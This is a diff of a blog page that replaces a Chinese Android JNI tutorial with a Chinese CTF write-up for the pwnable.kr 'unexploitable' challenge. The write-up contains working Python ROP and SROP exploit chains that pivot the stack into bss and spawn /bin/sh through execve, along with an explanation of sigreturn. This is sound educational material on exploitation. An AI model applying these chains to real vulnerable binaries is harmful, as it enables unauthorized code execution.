@@ -81,17 +81,20 @@
 
 
 
-<meta name="description" content="JNI简介http://www.jianshu.com/p/aba734d5b5cd 函数注册实例java 12345678public class AndroidJni &amp;#123;     static&amp;#123;          System.loadLibrary(&amp;quot;main&amp;quot;);     &amp;#125;          public native void dyn">
+<meta name="description" content="pwnable.kr-unexploitable(SROP)Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) 一个栈溢出漏洞。 rop利用syscall(59)代替执行execve得到rax=59（">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JNI 简介">
-<meta property="og:url" content="http://fancy-blogs.com/2017/12/28/JNI-introduce/index.html">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="http://fancy-blogs.com/2019/09/02/SROP/index.html">
 <meta property="og:site_name" content="fancy&#39;s blog">
-<meta property="og:description" content="JNI简介http://www.jianshu.com/p/aba734d5b5cd 函数注册实例java 12345678public class AndroidJni &amp;#123;     static&amp;#123;          System.loadLibrary(&amp;quot;main&amp;quot;);     &amp;#125;          public native void dyn">
+<meta property="og:description" content="pwnable.kr-unexploitable(SROP)Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) 一个栈溢出漏洞。 rop利用syscall(59)代替执行execve得到rax=59（">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2017-12-27T19:10:46.561Z">
+<meta property="og:image" content="http://fancy-blogs.com/2019/09/02/SROP/15673894987140.jpg">
+<meta property="og:image" content="http://fancy-blogs.com/2019/09/02/SROP/15673912142638.jpg">
+<meta property="og:updated_time" content="2019-09-02T08:31:21.109Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JNI 简介">
-<meta name="twitter:description" content="JNI简介http://www.jianshu.com/p/aba734d5b5cd 函数注册实例java 12345678public class AndroidJni &amp;#123;     static&amp;#123;          System.loadLibrary(&amp;quot;main&amp;quot;);     &amp;#125;          public native void dyn">
+<meta name="twitter:title" content="SROP">
+<meta name="twitter:description" content="pwnable.kr-unexploitable(SROP)Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) 一个栈溢出漏洞。 rop利用syscall(59)代替执行execve得到rax=59（">
+<meta name="twitter:image" content="http://fancy-blogs.com/2019/09/02/SROP/15673894987140.jpg">
 
 
 
@@ -121,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://fancy-blogs.com/2017/12/28/JNI-introduce/"/>
+  <link rel="canonical" href="http://fancy-blogs.com/2019/09/02/SROP/"/>
 
 
 
 
 
-  <title>JNI 简介 | fancy's blog</title>
+  <title>SROP | fancy's blog</title>
   
 
 
@@ -274,7 +277,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://fancy-blogs.com/2017/12/28/JNI-introduce/">
+    <link itemprop="mainEntityOfPage" href="http://fancy-blogs.com/2019/09/02/SROP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fancy">
@@ -291,7 +294,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">JNI 简介</h1>
+          <h1 class="post-title" itemprop="name headline">SROP</h1>
         
 
         <div class="post-meta">
@@ -303,8 +306,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T02:35:48+08:00">
-                2017-12-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-02T16:29:15+08:00">
+                2019-09-02
               </time>
             
 
@@ -322,8 +325,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/12/28/JNI-introduce/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/12/28/JNI-introduce/" itemprop="commentsCount"></span>
+                <a href="/2019/09/02/SROP/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/09/02/SROP/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -357,53 +360,28 @@
       
 
       
-        <script src="/assets/js/APlayer.min.js"> </script><h1 id="JNI简介"><a href="#JNI简介" class="headerlink" title="JNI简介"></a>JNI简介</h1><p><a href="http://www.jianshu.com/p/aba734d5b5cd" target="_blank" rel="noopener">http://www.jianshu.com/p/aba734d5b5cd</a></p>
-<h2 id="函数注册"><a href="#函数注册" class="headerlink" title="函数注册"></a>函数注册</h2><p>实例<br>java</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class AndroidJni &#123;</span><br><span class="line">     static&#123;</span><br><span class="line">          System.loadLibrary(&quot;main&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     public native void dynamicLog();</span><br><span class="line">     public native void staticLog();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>C++</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">#define LOG_TAG &quot;main.cpp&quot;</span><br><span class="line">#include &quot;mylog.h&quot;</span><br><span class="line">static void nativeDynamicLog(JNIEnv *evn, jobject obj)&#123;</span><br><span class="line">    LOGE(&quot;hell main&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_com_github_songnick_jni_AndroidJni_staticLog (JNIEnv *env, jobject obj)</span><br><span class="line">&#123;</span><br><span class="line">    LOGE(&quot;static register log &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNINativeMethod nativeMethod[] = &#123;&#123;&quot;dynamicLog&quot;, &quot;()V&quot;, (void*)nativeDynamicLog&#125;,&#125;;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *jvm, void *reserved) &#123;</span><br><span class="line">    JNIEnv *env;</span><br><span class="line">    if (jvm-&gt;GetEnv((void**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGE(&quot;JNI_OnLoad comming&quot;);</span><br><span class="line">    jclass clz = env-&gt;FindClass(&quot;com/github/songnick/jni/AndroidJni&quot;);</span><br><span class="line"></span><br><span class="line">    env-&gt;RegisterNatives(clz, nativeMethod, sizeof(nativeMethod)/sizeof(nativeMethod[0]));</span><br><span class="line"></span><br><span class="line">    return JNI_VERSION_1_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>要完成的任务是将java中声明的函数和C++中定义的函数链接起来。</p>
-<h3 id="静态注册native函数"><a href="#静态注册native函数" class="headerlink" title="静态注册native函数"></a>静态注册native函数</h3><p>模版：<br>JINEXPORT+返回类型+JNICALL+以_连接的java类作为函数名（JNIEnv* evn, jobject obj）{}</p>
-<p>JNIEXPORT和JNICALL关键字，这两个关键字是两个宏定义，他主要的作用就是说明该函数为JNI函数。java虚拟机加载so时会将检查到的带宏定义的函数，根据函数名链接到对应类的对应native函数。</p>
-<p><code>javah -d jni (package)</code></p>
-<h3 id="动态注册native函数"><a href="#动态注册native函数" class="headerlink" title="动态注册native函数"></a>动态注册native函数</h3><p>当我们使用System.loadLibarary()方法加载so库的时候，Java虚拟机就会找到这个函数并调用该函数，因此可以在该函数中做一些初始化的动作，其实这个函数就是相当于Activity中的onCreate()方法。该函数前面有三个关键字，分别是JNIEXPORT、JNICALL和jint，其中JNIEXPORT和JNICALL是两个宏定义，用于指定该函数是JNI函数。jint是JNI定义的数据类型，因为Java层和C/C++的数据类型或者对象不能直接相互的引用或者使用，JNI层定义了自己的数据类型，用于衔接Java层和JNI层，至于这些数据类型我们在后面介绍。这里的jint对应Java的int数据类型，该函数返回的int表示当前使用的JNI的版本，其实类似于Android系统的API版本一样，不同的JNI版本中定义的一些不同的JNI函数。</p>
-<h2 id="so加载"><a href="#so加载" class="headerlink" title="so加载"></a>so加载</h2><p> System.loadLibarary()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void loadLibrary(String libName) &#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> loadlibrary()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">void loadLibrary(String libraryName, ClassLoader loader) &#123;</span><br><span class="line">        if (loader != null) &#123;</span><br><span class="line">            String filename = loader.findLibrary(libraryName);</span><br><span class="line">            if (filename == null) &#123;</span><br><span class="line">                throw new UnsatisfiedLinkError(&quot;Couldn&apos;t load &quot; + libraryName + &quot;: &quot; +</span><br><span class="line">                        &quot;findLibrary returned null&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String error = nativeLoad(filename, loader);</span><br><span class="line">            if (error != null) &#123;</span><br><span class="line">                throw new UnsatisfiedLinkError(error);</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filename = System.mapLibraryName(libraryName);</span><br><span class="line">        List&lt;String&gt; candidates = new ArrayList&lt;String&gt;();</span><br><span class="line">        String lastError = null;</span><br><span class="line">        for (String directory : mLibPaths) &#123;</span><br><span class="line">            String candidate = directory + filename;</span><br><span class="line">            candidates.add(candidate);</span><br><span class="line">            if (new File(candidate).exists()) &#123;</span><br><span class="line">                String error = nativeLoad(candidate, loader);</span><br><span class="line">                if (error == null) &#123;</span><br><span class="line">                    return; // We successfully loaded the library. Job done.</span><br><span class="line">                &#125;</span><br><span class="line">                lastError = error;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (lastError != null) &#123;</span><br><span class="line">            throw new UnsatisfiedLinkError(lastError);</span><br><span class="line">        &#125;</span><br><span class="line">        throw new UnsatisfiedLinkError(&quot;Library &quot; + libraryName + &quot; not found; tried &quot; + candidates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="http://blog.sina.com.cn/s/blog_4c0706560102vc6o.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4c0706560102vc6o.html</a><br>loadLibrary -&gt; nativeLoad(即Dalvik_java_lang_Runtime_nativeLoad) -&gt; dvmLoadNativeCode -&gt; dlopen\dlsym</p>
-<p>最终通过dlopen函数完成的，只是本地库加载完后紧接着会查找库中是否有JNI_OnLoad函数，如果有会执行一下。</p>
-<p>dvmLoadNativeCode()这个函数还真的是有点复杂，那就挑那些跟我们的JNI比较紧密相关的逻辑来看吧。可以认为这个函数做了下面的这样一些事情：</p>
-<ul>
-<li>调用dlopen() 打开一个so文件，创建一个handle。</li>
-<li>调用dlsym()函数，查找到so文件中的JNI_OnLoad()这个函数的函数指针。</li>
-<li>执行上一步找到的那个JNI_OnLoad()函数。</li>
-</ul>
-<p><a href="http://blog.csdn.net/dj0379/article/details/53350038" target="_blank" rel="noopener">http://blog.csdn.net/dj0379/article/details/53350038</a></p>
-<h3 id="注册函数"><a href="#注册函数" class="headerlink" title="注册函数"></a>注册函数</h3><p>先看JNI_OnLoad方法，这是注册native函数的地方。</p>
-<ul>
-<li>首先判断jni版本是不是JNI_VERSION_1_4</li>
-<li>FindClass方法找到我们对应生命native函数的类，返回一个jclass</li>
-<li>RegisterNatives 注册native函数，我这里用这个三个参数的方法，第一个表示对应jclass，第二个表示JNINativeMethod的数组，第三个，这个就是我们先前命名的宏。</li>
-</ul>
-<p>JNINativeMethod数组</p>
-<p>对应结构体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">     const char* name;//Java层native方法的名字</span><br><span class="line">     const char* signature;//Java层native方法的描述符</span><br><span class="line">     void* fnPtr;//对应JNI函数的指针</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNINativeMethod nativeMethod[] = &#123;&#123;&quot;dynamicLog&quot;, &quot;()V&quot;, (void*)nativeDynamicLog&#125;,&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>第一个参数对应的native方法名</li>
-<li>第二个参数对应 native方法的描述，我们通过javap -s class文件路径来获取。</li>
-<li>第三个参数对应的是c++代码里对应的实现</li>
-</ul>
-<p>RegisterNatives函数</p>
-<ul>
-<li>第一个参数是Java层对应包含native方法的对象(这里就是AndroidJni对象)，通过调用JNIEnv对应的函数获取class对象(FindClass函数的参数为需要获取class对象的类描述符)</li>
-<li>第二个参数是JNINativeMethod结构体指针，这里的JNINativeMethod结构体是描述Java层native方法的，也就是之前定义的数组</li>
-<li>第三个参数为注册native方法的数量。一般会动态注册多个native方法，首先会定义一个JNINativeMethod数组，然后将该数组指针作为RegisterNative函数的参数传入</li>
-</ul>
-<p>描述符<br>对应smail语法</p>
-<p>JNIEnv<br><a href="http://blog.csdn.net/banketree/article/details/40535325" target="_blank" rel="noopener">http://blog.csdn.net/banketree/article/details/40535325</a></p>
-<h2 id="java和native之间的数据传递"><a href="#java和native之间的数据传递" class="headerlink" title="java和native之间的数据传递"></a>java和native之间的数据传递</h2><p><a href="http://blog.csdn.net/qinjuning/article/details/7607214" target="_blank" rel="noopener">http://blog.csdn.net/qinjuning/article/details/7607214</a></p>
+        <script src="/assets/js/APlayer.min.js"> </script><h1 id="pwnable-kr-unexploitable-SROP"><a href="#pwnable-kr-unexploitable-SROP" class="headerlink" title="pwnable.kr-unexploitable(SROP)"></a>pwnable.kr-unexploitable(SROP)</h1><pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre><p>一个栈溢出漏洞。</p>
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>利用syscall(59)代替执行execve<br>得到rax=59（利用read返回值）</p>
+<ol>
+<li>bss中写入跳入bss的rop</li>
+<li>构造利用read读取59字节的rop</li>
+<li>执行syscall</li>
+</ol>
+<p>填充main栈</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x200</span></span><br><span class="line">bash_addr = <span class="number">0x0000000000601028</span> + <span class="number">0x400</span></span><br><span class="line">syscall_addr = <span class="number">0x00400560</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00400512</span></span><br><span class="line">leave_ret = <span class="number">0x00400576</span></span><br><span class="line">part1 = <span class="number">0x004005e6</span></span><br><span class="line">part2 = <span class="number">0x004005d0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP first ret to part1</span></span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)       <span class="comment"># ret to part2 prepare to execute the call</span></span><br><span class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span>       <span class="comment"># for add rsp,0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span>              <span class="comment">#填充main的栈</span></span><br><span class="line">payload1 += p64(bss_base)           <span class="comment">#bss_base-&gt;rbp</span></span><br><span class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x200</span>)<span class="comment">#write rop to bss</span></span><br><span class="line">payload1 += p64(pop_rbp_ret)    <span class="comment">#ret to pop instruction make the rbp point to bss[+I1]</span></span><br><span class="line">payload1 += p64(bss_base)       <span class="comment">#pop value[-I1]</span></span><br><span class="line">payload1 += p64(leave_ret)      <span class="comment">#ret to leave instruction[+I2]</span></span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)   <span class="comment">#the value pop to rbp[-I2]</span></span><br><span class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bash_addr, <span class="number">0x200</span>)<span class="comment">#write payload to bash_addr and make the value of rax is the return-value of read[-I2]</span></span><br><span class="line">payload2 += call_function(bash_addr+<span class="number">0x10</span>, bash_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>, <span class="string">"B"</span>) </span><br><span class="line">payload3 += p64(syscall_addr)   <span class="comment">#the address of instruction to call</span></span><br><span class="line">payload3 = payload3.ljust(<span class="number">59</span>, <span class="string">"D"</span>)</span><br></pre></td></tr></table></figure>
+<p>rop流程：<br>第一次read：将read调用rop和跳转到bss段执行所需的rop写入栈<br>第二次read：将调用read的rop和调用syscall的rop写入bss<br>第三次read：将”/bin/sh”写入bash_addr，将syscall地址设置为返回地址，并将payload填充至59字节，使得read调用返回值为59触发execve。</p>
+<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）</p>
+<p><img src="/2019/09/02/SROP/15673894987140.jpg" alt=""></p>
+<p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p>
+<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p>
+<p><img src="/2019/09/02/SROP/15673912142638.jpg" alt=""></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>之前通过ROP的方式实现利用，但是需要构造的gadgets很多，流程也十分繁琐，而利用SROP利用流程就变得简洁许多。<br>同样利用read将调用read的rop和跳转到bss段执行所需的rop写入栈，利用第二次调用read将sig_frame和”/bin/sh”写入bss，并且构造第三次调用read的rop，第三次调用read是为了将rax设置为15，使syscall触发__NR_rt_sigreturn，sigreturn被设置为syscall，rdi为”/bin/sh”地址，rax为59，成功执行execve(“/bin/sh”)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)</span><br><span class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">sig_frame = SigreturnFrame()              <span class="comment">#设置SROP Frame</span></span><br><span class="line">sig_frame.rax = <span class="number">59</span></span><br><span class="line">sig_frame.rdi = bss_base+<span class="number">0x200</span></span><br><span class="line">sig_frame.rsi = <span class="number">0</span></span><br><span class="line">sig_frame.rdx = <span class="number">0</span></span><br><span class="line">sig_frame.rip = syscall_addr</span><br><span class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x300</span>)</span><br><span class="line">payload1 += p64(pop_rbp_ret)</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, sig_stage, <span class="number">0x100</span>)</span><br><span class="line">payload2 += sig_frame</span><br><span class="line">payload2  = payload2.ljust(<span class="number">0x200</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload3  = <span class="string">"D"</span> * <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -428,8 +406,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/25/PYCfileformat/" rel="next" title="PYC文件格式">
-                <i class="fa fa-chevron-left"></i> PYC文件格式
+              <a href="/2019/03/22/rebuildpass/" rel="next" title="移植OLLVM混淆pass">
+                <i class="fa fa-chevron-left"></i> 移植OLLVM混淆pass
               </a>
             
           </div>
@@ -437,10 +415,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/29/AndroidManifest/" rel="prev" title="AndroidManifest.xml文件格式">
-                AndroidManifest.xml文件格式 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -596,7 +570,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNI简介"><span class="nav-number">1.</span> <span class="nav-text">JNI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#函数注册"><span class="nav-number">1.1.</span> <span class="nav-text">函数注册</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态注册native函数"><span class="nav-number">1.1.1.</span> <span class="nav-text">静态注册native函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态注册native函数"><span class="nav-number">1.1.2.</span> <span class="nav-text">动态注册native函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#so加载"><span class="nav-number">1.2.</span> <span class="nav-text">so加载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注册函数"><span class="nav-number">1.2.1.</span> <span class="nav-text">注册函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java和native之间的数据传递"><span class="nav-number">1.3.</span> <span class="nav-text">java和native之间的数据传递</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-kr-unexploitable-SROP"><span class="nav-number">1.</span> <span class="nav-text">pwnable.kr-unexploitable(SROP)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">1.1.</span> <span class="nav-text">rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#srop"><span class="nav-number">1.2.</span> <span class="nav-text">srop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.2.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></div>
             
 
           </div>
